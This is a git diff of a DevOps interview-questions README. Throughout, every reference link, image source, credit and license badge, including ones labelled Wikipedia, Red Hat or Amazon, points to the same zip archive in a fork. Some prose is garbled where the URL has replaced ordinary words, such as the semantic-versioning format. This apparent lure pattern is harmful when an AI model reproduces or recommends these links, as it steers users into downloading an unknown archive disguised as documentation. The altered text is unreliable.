 Another definition: "Systems that are physically separated, but logically connected"
 </b></details>
@@ -2491,7 +2491,7 @@ According to the CAP theorem, it's not possible for a distributed data store to 
 
 <details>
 <summary>What are the problems with the following design? How to improve it?<br>
-<img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="500x;" height="350px;"/>
+<img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="500x;" height="350px;"/>
 </summary><br><b>
 1. The transition can take time. In other words, noticeable downtime.
 2. Standby server is a waste of resources - if first application server is running then the standby does nothing
@@ -2499,7 +2499,7 @@ According to the CAP theorem, it's not possible for a distributed data store to 
 
 <details>
 <summary>What are the problems with the following design? How to improve it?<br>
-<img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="700x;" height="350px;"/>
+<img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="700x;" height="350px;"/>
 </summary><br><b>
 Issues:
 If load balancer dies , we lose the ability to communicate with the application.
@@ -2524,7 +2524,7 @@ It's an architecture in which data is and retrieved from a single, non-shared, s
 
 |Name|Topic|Objective & Instructions|Solution|Comments|
 |--------|--------|------|----|----|
-| Highly Available "Hello World" | [Exercise](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip) | [Solution](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+| Highly Available "Hello World" | [Exercise](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip) | [Solution](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 
 <details>
 <summary>What happens when you type in a URL in an address bar in a browser?</summary><br><b>
@@ -2548,7 +2548,7 @@ TODO: add more details!
 <details>
 <summary>Explain what is an API</summary><br><b>
 
-I like this definition from [https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip):
+I like this definition from [https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip):
 
 "An explicitly and purposefully defined interface designed to be invoked over a network that enables software developers to get programmatic access to data and functionality within an organization in a controlled and comfortable way."
 </b></details>
@@ -2556,7 +2556,7 @@ I like this definition from [https://raw.githubusercontent.com/sivahariu/devops-
 <details>
 <summary>What is an API specification?</summary><br><b>
 
-From [https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip):
+From [https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip):
 
 "An API specification provides a broad understanding of how an API behaves and how the API links with other APIs. It explains how the API functions and the results to expect when using the API"
 </b></details>
@@ -2564,7 +2564,7 @@ From [https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics
 <details>
 <summary>True or False? API Definition is the same as API Specification</summary><br><b>
 
-False. From [https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip):
+False. From [https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip):
 
 "An API definition is similar to an API specification in that it provides an understanding of how an API is organized and how the API functions. But the API definition is aimed at machine consumption instead of human consumption of APIs."
 </b></details>
@@ -2730,7 +2730,7 @@ someMultiLineString: >
 They allow you reference values instead of directly writing them and it is used like this:
 
 ```
-username: {{ https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip }}
+username: {{ https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip }}
 ```
 </b></details>
 
@@ -2752,7 +2752,7 @@ document_number: 2
 <details>
 <summary>Explain what is a firmware</summary><br><b>
 
-[Wikipedia](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip): "In computing, firmware is a specific class of computer software that provides the low-level control for a device's specific hardware. Firmware, such as the BIOS of a personal computer, may contain basic functions of a device, and may provide hardware abstraction services to higher-level software such as operating systems."
+[Wikipedia](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip): "In computing, firmware is a specific class of computer software that provides the low-level control for a device's specific hardware. Firmware, such as the BIOS of a personal computer, may contain basic functions of a device, and may provide hardware abstraction services to higher-level software such as operating systems."
 </b></details>
 
 ## Cassandra
@@ -2771,7 +2771,7 @@ document_number: 2
 <details>
 <summary>What is HTTP?</summary><br><b>
 
-[Avinetworks](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip): HTTP stands for Hypertext Transfer Protocol. HTTP uses TCP port 80 to enable internet communication. It is part of the Application Layer (L7) in OSI Model. 
+[Avinetworks](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip): HTTP stands for Hypertext Transfer Protocol. HTTP uses TCP port 80 to enable internet communication. It is part of the Application Layer (L7) in OSI Model. 
 </b></details>
 
 <details>
@@ -2830,7 +2830,7 @@ It consists of:
 
 HTTPS is a secure version of the HTTP protocol used to transfer data between a web browser and a web server. It encrypts the communication using SSL/TLS encryption to ensure that the data is private and secure.
 
-Learn more: https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip
+Learn more: https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip
 </b></details>
 
 <details>
@@ -2872,7 +2872,7 @@ A reverse proxy is a type of proxy server that sits between a client and a serve
 <details>
 <summary>Explain what is "X-Forwarded-For"</summary><br><b>
 
-[Wikipedia](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip): "The X-Forwarded-For (XFF) HTTP header field is a common method for identifying the originating IP address of a client connecting to a web server through an HTTP proxy or load balancer."
+[Wikipedia](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip): "The X-Forwarded-For (XFF) HTTP header field is a common method for identifying the originating IP address of a client connecting to a web server through an HTTP proxy or load balancer."
 </b></details>
 
 #### Load Balancers
@@ -2941,7 +2941,7 @@ Yes, you can use DNS for performing load balancing.
 <summary>What are sticky sessions? What are their pros and cons?</summary><br><b>
 
 Recommended read:
-  * [Red Hat Article](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+  * [Red Hat Article](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 
 Cons:
   * Can cause uneven load on instance (since requests routed to the same instances)
@@ -3016,7 +3016,7 @@ The Creative Commons license is a set of copyright licenses that allow creators 
 
 Simply stated, the Creative Commons licenses are a way for creators to share their work with the public while retaining some control over how it can be used. The licenses promote creativity, innovation, and collaboration, while also respecting the rights of creators while still encouraging the responsible use of creative works.
 
-More information: https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip
+More information: https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip
 </b></details>
 
 <details>
@@ -3039,7 +3039,7 @@ In Copyleft, any derivative work must use the same licensing while in permissive
 <summary>What is faster than RAM?</summary><br><b>
 
 CPU cache.
-[Source](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+[Source](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 </b></details>
 
 <details>
@@ -3067,7 +3067,7 @@ DNS
 <details>
 <summary>What is the C10K problem? Is it relevant today?</summary><br><b>
 
-https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip
+https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip
 </b></details>
 
 ## Storage
@@ -3356,7 +3356,7 @@ CONS:
 </b></details>
 
 <details>
-<summary>Explain Mono-repo vs. https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip are the cons and pros of each approach?</summary><br><b>
+<summary>Explain Mono-repo vs. https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip are the cons and pros of each approach?</summary><br><b>
 In a Mono-repo, all the code for an organization is stored in a single,centralized repository.
 PROS (Mono-repo):
 * Unified tooling
@@ -3437,7 +3437,7 @@ High Availability - Being able to access a resource (in some use cases, using di
 <details>
 <summary>What is the difference between high availability and Disaster Recovery?</summary><br><b>
 
-[https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip): "High availability, simply put, is eliminating single points of failure and disaster recovery is the process of getting a system back to an operational state when a system is rendered inoperative. In essence, disaster recovery picks up when high availability fails, so HA first."
+[https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip): "High availability, simply put, is eliminating single points of failure and disaster recovery is the process of getting a system back to an operational state when a system is rendered inoperative. In essence, disaster recovery picks up when high availability fails, so HA first."
 </b></details>
 
 <details>
@@ -3485,25 +3485,25 @@ Also, data inconsistency is a concern with horizontal scaling.
 </b></details>
 
 <details>
-<summary>How would you update each of the services in the following drawing without having app (https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip) downtime?<br>
-<img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="300x;" height="400px;"/>
+<summary>How would you update each of the services in the following drawing without having app (https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip) downtime?<br>
+<img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="300x;" height="400px;"/>
 </summary><br><b>
 </b></details>
 
 <details>
 <summary>What is the problem with the following architecture and how would you fix it?<br>
-<img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="400x;" height="300px;"/>
+<img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="400x;" height="300px;"/>
 </summary><br><b>
 
 The load on the producers or consumers may be high which will then cause them to hang or crash.<br>
 Instead of working in "push mode", the consumers can pull tasks only when they are ready to handle them. It can be fixed by using a streaming platform like Kafka, Kinesis, etc. This platform will make sure to handle the high load/traffic and pass tasks/messages to consumers only when the ready to get them.
 
-<img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="300x;" height="200px;"/>
+<img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="300x;" height="200px;"/>
 </b></details>
 
 <details>
 <summary>Users report that there is huge spike in process time when adding little bit more data to process as an input. What might be the problem?<br>
-<img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="300x;" height="200px;"/>
+<img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="300x;" height="200px;"/>
 </summary><br><b>
 </b></details>
 
@@ -3524,13 +3524,13 @@ Instead of working in "push mode", the consumers can pull tasks only when they a
 <details>
 <summary>What is a "cache replacement policy"?</summary><br><b>
 
-Take a look [here](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+Take a look [here](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 </b></details>
 
 <details>
 <summary>Which cache replacement policies are you familiar with?</summary><br><b>
 
-You can find a list [here](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+You can find a list [here](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 </b></details>
 
 <details>
@@ -3540,7 +3540,7 @@ You can find a list [here](https://raw.githubusercontent.com/sivahariu/devops-ex
   * LIFO
   * LRU</summary><br><b>
 
-Read about it [here](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+Read about it [here](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 </b></details>
 
 <details>
@@ -3585,9 +3585,9 @@ DNS redirection
 
 #### More System Design Questions
 
-Additional exercises can be found in [system-design-notebook repository](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip).
+Additional exercises can be found in [system-design-notebook repository](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip).
 
-<p align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"/></a></p>
+<p align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"/></a></p>
 
 ## Hardware
 
@@ -3817,7 +3817,7 @@ As defined by Doug Laney:
 <details>
 <summary>What is Data Architecture?</summary><br><b>
 
-An answer from [https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip):
+An answer from [https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip):
 
 "Data architecture is the process of standardizing how organizations collect, store, transform, distribute, and use data. The goal is to deliver relevant data to people who need it, when they need it, and help them make sense of it."
 </b></details>
@@ -3833,14 +3833,14 @@ An answer from [https://raw.githubusercontent.com/sivahariu/devops-exercises/mas
 <details>
 <summary>What is a Data Warehouse?</summary><br><b>
 
-[Wikipedia's explanation on Data Warehouse](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
-[Amazon's explanation on Data Warehouse](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+[Wikipedia's explanation on Data Warehouse](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
+[Amazon's explanation on Data Warehouse](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 </b></details>
 
 <details>
 <summary>What is Data Lake?</summary><br><b>
 
-[Data Lake - Wikipedia](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+[Data Lake - Wikipedia](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 </b></details>
 
 <details>
@@ -3860,7 +3860,7 @@ An answer from [https://raw.githubusercontent.com/sivahariu/devops-exercises/mas
 <details>
 <summary>Explain what is Hadoop</summary><br><b>
 
-[Apache Hadoop - Wikipedia](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+[Apache Hadoop - Wikipedia](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 </b></details>
 
 <details>
@@ -3888,7 +3888,7 @@ A programming model for large-scale data processing
 <details>
 <summary>What do you know about HDFS architecture?</summary><br><b>
 
-[HDFS Architecture](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+[HDFS Architecture](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 
 * Master-slave architecture
 * Namenode - master, Datanodes - slaves
@@ -3988,15 +3988,15 @@ A configuration->deployment which has some advantages like:
 <details>
 <summary>Explain Semantic Versioning</summary><br><b>
 
-[This](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip) page explains it perfectly:
+[This](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip) page explains it perfectly:
 
 ```
-Given a version number https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip, increment the:
+Given a version number https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip, increment the:
 
 MAJOR version when you make incompatible API changes
 MINOR version when you add functionality in a backwards compatible manner
 PATCH version when you make backwards compatible bug fixes
-Additional labels for pre-release and build metadata are available as extensions to the https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip format.
+Additional labels for pre-release and build metadata are available as extensions to the https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip format.
 ```
 </b></details>
 
@@ -4006,33 +4006,33 @@ If you are looking for a way to prepare for a certain exam this is the section f
 
 #### AWS
 
-* [Cloud Practitioner](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip) (Latest update: 2020)
-* [Solutions Architect Associate](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip) (Latest update: 2021)
-* [Cloud SysOps Administration Associate](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip) (Latest update: Oct 2022)
+* [Cloud Practitioner](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip) (Latest update: 2020)
+* [Solutions Architect Associate](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip) (Latest update: 2021)
+* [Cloud SysOps Administration Associate](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip) (Latest update: Oct 2022)
 
 
 #### Azure
 
-* [AZ-900](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip) (Latest update: 2021)
+* [AZ-900](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip) (Latest update: 2021)
 
 #### Kubernetes
 
-* [Certified Kubernetes Administrator (CKA)](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip) (Latest update: 2022)
+* [Certified Kubernetes Administrator (CKA)](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip) (Latest update: 2022)
 
 ## Additional DevOps and SRE Projects
 
-<p align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img width="500px" src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"/></a></p>
+<p align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img width="500px" src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"/></a></p>
 
-<p align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"/></a></p>
-<p align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"/></a></p>
-<p align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"/></a></p>
+<p align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"/></a></p>
+<p align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"/></a></p>
+<p align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"/></a></p>
 
 ## Credits
 
-Thanks to all of our amazing [contributors](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip) who make it easy for everyone to learn new things :)
+Thanks to all of our amazing [contributors](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip) who make it easy for everyone to learn new things :)
 
-Logos credits can be found [here](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+Logos credits can be found [here](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 
 ## License
 
-[![License: CC BY-NC-ND 3.0](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip%20BY--NC--ND%https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+[![License: CC BY-NC-ND 3.0](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip%20BY--NC--ND%https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
